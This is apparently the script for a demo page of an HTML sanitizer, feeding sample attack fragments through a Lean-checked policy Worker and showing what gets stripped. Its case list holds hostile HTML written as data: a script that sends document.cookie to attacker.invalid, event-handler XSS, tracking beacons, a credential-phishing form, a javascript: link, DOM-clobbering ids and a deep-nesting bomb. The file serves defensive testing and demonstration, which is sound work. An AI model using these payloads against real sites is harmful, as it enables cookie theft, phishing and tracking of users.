// Attack showcase. Every scenario goes through the same production path as the
// editor demo: the policy Worker parses with parse5 under the preprocessing
// limits, builds a candidate, the LEAN/WASM CHECKER decides, and the host
// commits the one-time acceptance record that verdict produced. The frame
// takes records, not trees, so there is no way for this page to render
// anything Lean did not accept. Nothing is parsed on this thread.
import manifest from "../dist/frame-manifest.js";
import { createSandboxFrame } from "../src/host.js";
import { createPolicySession } from "../src/policy-client.js";
import { setClassAllowlist } from "../src/policy.js";
// Embedded by scripts/build.mjs. The Worker is created from a blob: URL so it
// inherits this document's CSP; a same-origin network Worker would not. See
// docs/csp.md.
import policyWorkerSource from "guard:policy-worker-source";
import { createBlobWorker } from "../src/startup.js";

// For src/host.js's own re-check of the tree it posts to the frame; the parse
// and the policy decision itself happen in the Worker.
setClassAllowlist(manifest.classes);

const policy = createPolicySession({
  createWorker: () => createBlobWorker(policyWorkerSource),
  classes: manifest.classes,
});

const cases = [
  {
    id: "script",
    category: "Code execution",
    title: "Script and event-handler injection",
    summary: "Executable elements and inline handlers are removed while ordinary content survives.",
    html: `<div class="card stack">
  <h2 class="title" onclick="alert(document.cookie)">Account notice</h2>
  <script>fetch("https://attacker.invalid/steal?cookie=" + document.cookie)</script>
  <p onmouseover="alert(1)">Your report is ready.</p>
  <button formaction="https://attacker.invalid/submit">Continue</button>
</div>`,
  },
  {
    id: "network",
    category: "Data exfiltration",
    title: "Automatic network requests",
    summary: "Fetching elements and URL-bearing attributes are absent from the reconstructed tree; frame CSP also denies connections.",
    html: `<div class="card stack">
  <h2 class="title">Tracking payload</h2>
  <img src="https://attacker.invalid/pixel?user=123">
  <iframe src="https://attacker.invalid/collect"></iframe>
  <link rel="preload" href="https://attacker.invalid/log">
  <svg><image href="https://attacker.invalid/beacon.svg"></image></svg>
  <p class="muted">The visible explanation remains.</p>
</div>`,
  },
  {
    id: "navigation",
    category: "Navigation and phishing",
    title: "Links and credential forms",
    summary: "Links are unwrapped, forms are unwrapped, password controls are rejected, and autocomplete is forced off.",
    html: `<div class="card stack">
  <h2 class="title">Session expired</h2>
  <a href="https://attacker.invalid/login" target="_top">Sign in again</a>
  <form action="https://attacker.invalid/password" method="post">
    <label>Password <input type="password" name="password" autocomplete="current-password"></label>
    <button type="submit">Sign in</button>
  </form>
</div>`,
  },
  {
    id: "svg",
    category: "SVG execution surface",
    title: "SVG references and animation",
    summary: "Safe geometry remains, while referenced resources, animation, foreign content, and SVG links are removed.",
    html: `<svg viewBox="0 0 320 140" role="img" aria-label="Untrusted chart">
  <rect x="10" y="20" width="80" height="90" fill="#2563eb"></rect>
  <circle cx="150" cy="70" r="38" fill="rgb(22,163,74)"></circle>
  <use href="https://attacker.invalid/icons.svg#x"></use>
  <animate attributeName="x" values="0;100" dur="1s"></animate>
  <foreignObject><iframe src="https://attacker.invalid"></iframe></foreignObject>
  <a href="javascript:alert(1)"><text x="210" y="70">click</text></a>
</svg>`,
  },
  {
    id: "clobber",
    category: "DOM integrity",
    title: "DOM clobbering and style escape",
    summary: "IDs are namespaced, dangerous names and inline styles are removed, and unknown classes do not cross the policy.",
    html: `<div id="root" name="location" class="card evil-overlay"
     style="position:fixed;inset:0;z-index:999999">
  <h2 id="constructor" class="title">Overlay attempt</h2>
  <input id="__proto__" name="cookie" autofocus accesskey="x">
  <p class="muted unknown-class">The card remains contained.</p>
</div>`,
  },
  {
    id: "malformed",
    category: "Parser differentials",
    title: "Malformed and misnested markup",
    summary: "The HTML parser repairs the fragment first; the policy checks the resulting tree rather than trusting source-text patterns.",
    html: `<div class="card"><h2 class="title">Repair test
  <p>First paragraph <b>bold
  <table><div onclick="alert(1)">foster-parented text</div><tr><td>Cell
  <svg><desc><img src=x onerror="alert(2)"></desc><rect width="40" height="20">
</div>`,
  },
  {
    id: "limits",
    category: "Resource limits",
    title: "Nesting deeper than the preprocessing limit",
    summary: "Input work is bounded before the output policy runs: 5,000 nested elements are rejected by a limit in the policy Worker instead of overflowing a recursive adapter, and nothing is rendered.",
    html: "<div>".repeat(5000) + "deep" + "</div>".repeat(5000),
    expect: "rejected",
  },
];

const $ = (id) => document.getElementById(id);
const list = $("cases");
let current = null;

const VOID_HTML = new Set(["area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track", "wbr"]);

function escapeText(value) {
  return String(value).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function escapeAttribute(value) {
  return escapeText(value).replace(/"/g, "&quot;");
}

// This is explanatory output only. The security-sensitive renderer consumes
// the validated tree directly and never reparses this serialization.
function serializeTree(node, depth = 0) {
  if (node.kind === "text") return escapeText(node.text);
  if (node.kind === "root") return node.children.map((child) => serializeTree(child, depth)).join("\n");
  const indent = "  ".repeat(depth);
  const attrs = node.attrs.map(([name, value]) => ` ${name}="${escapeAttribute(value)}"`).join("");
  const open = `${indent}<${node.tag}${attrs}>`;
  if (node.ns === "html" && VOID_HTML.has(node.tag)) return open;
  if (node.children.length === 0) return `${open}</${node.tag}>`;
  const onlyText = node.children.every((child) => child.kind === "text");
  if (onlyText) return `${open}${node.children.map((child) => serializeTree(child, depth + 1)).join("")}</${node.tag}>`;
  const children = node.children.map((child) => serializeTree(child, depth + 1)).join("\n");
  return `${open}\n${children}\n${indent}</${node.tag}>`;
}

const frame = createSandboxFrame({
  container: $("frame-container"),
  manifest,
  // Acceptance records only; see src/acceptance.js.
  claimAcceptance: (token) => policy.claimAcceptance(token),
  onStatus: ({ kind, detail }) => {
    if (kind === "refused") setVerdict(`Frame refused: ${detail}`, true);
    if (kind === "startup-failed") setVerdict(`Frame startup failed (${detail.code}): ${detail.hint}`, true);
  },
});

// The wasm-init stage. If the Lean authority does not start, nothing on this
// page can be accepted, and the verdict says that rather than showing content.
policy.whenCheckerReady().catch((error) => {
  setVerdict(`Lean checker startup failed (${error.code ?? "unknown"}): nothing can be rendered`, true);
});

function setVerdict(text, rejected = false) {
  $("verdict").textContent = text;
  $("verdict").classList.toggle("rejected", rejected);
}

function describe(change) {
  const where = change.path ? ` at tree path ${change.path.join("/")}` : "";
  const why = change.why ? ` (${change.why})` : "";
  switch (change.kind) {
    case "removed-element": return `Removed <${change.tag}>${why}${where} — ${change.rule}`;
    case "unwrapped-element": return `Removed <${change.tag}> wrapper but kept safe children${where} — ${change.rule}`;
    case "removed-attribute": return `Removed ${change.tag}[${change.name}]${why}${where} — ${change.rule}`;
    case "rewrote-attribute": return `Rewrote ${change.tag}[${change.name}]${where} — ${change.rule}`;
    case "removed-node": return `Removed ${change.what || "unknown node"}${where} — ${change.rule}`;
    default: return JSON.stringify(change);
  }
}

async function show(entry) {
  current = entry.id;
  for (const button of list.querySelectorAll("button")) button.setAttribute("aria-current", String(button.dataset.id === entry.id));
  $("case-category").textContent = entry.category;
  $("case-title").textContent = entry.title;
  $("case-summary").textContent = entry.summary;
  // Keep the source panel bounded: one scenario is deliberately enormous.
  $("source").textContent = entry.html.length > 4000
    ? `${entry.html.slice(0, 4000)}\n… ${entry.html.length} characters total`
    : entry.html;
  $("filtered-html").textContent = "";
  $("report").replaceChildren();
  setVerdict("Checking…");

  // A new scenario supersedes any in-flight work for the previous one.
  policy.nextGeneration();
  const result = await policy.preprocess(entry.html);
  if (current !== entry.id) return; // a newer scenario took over while we waited

  if (result.status !== "accepted") {
    const reason = result.status === "superseded" ? { code: "superseded" } : result.reason;
    setVerdict(`Rejected in the policy worker: ${reason.code}`, true);
    $("change-count").textContent = "0 transformation(s)";
    addReport(JSON.stringify(reason));
    if (reason.limit) addReport(`limit ${reason.limit} = ${reason.limitValue}, observed ${reason.observed}`);
    $("filtered-html").textContent = "(nothing was rendered)";
    frame.clear();
    return;
  }

  $("filtered-html").textContent = serializeTree(result.tree);
  const { records, total, truncated } = result.diagnostics;
  $("change-count").textContent = `${total} transformation(s)`;
  if (total === 0) addReport("No unsafe constructs found.", true);
  for (const change of records) addReport(describe(change));
  if (truncated) addReport(`diagnostics truncated at ${records.length} of ${total}`);
  const rendered = await frame.render(result.acceptance);
  setVerdict(rendered ? `Protected and rendered (accepted by ${result.authority})` : "Frame refused output", !rendered);
}

function addReport(text, safe = false) {
  const item = document.createElement("li");
  item.textContent = text;
  if (safe) item.className = "safe";
  $("report").appendChild(item);
}

for (const entry of cases) {
  const button = document.createElement("button");
  button.type = "button";
  button.className = "case-button";
  button.dataset.id = entry.id;
  const title = document.createElement("strong");
  title.textContent = entry.title;
  const category = document.createElement("span");
  category.textContent = entry.category;
  button.append(title, category);
  button.addEventListener("click", () => { if (current !== entry.id) show(entry); });
  list.appendChild(button);
}

show(cases[0]);
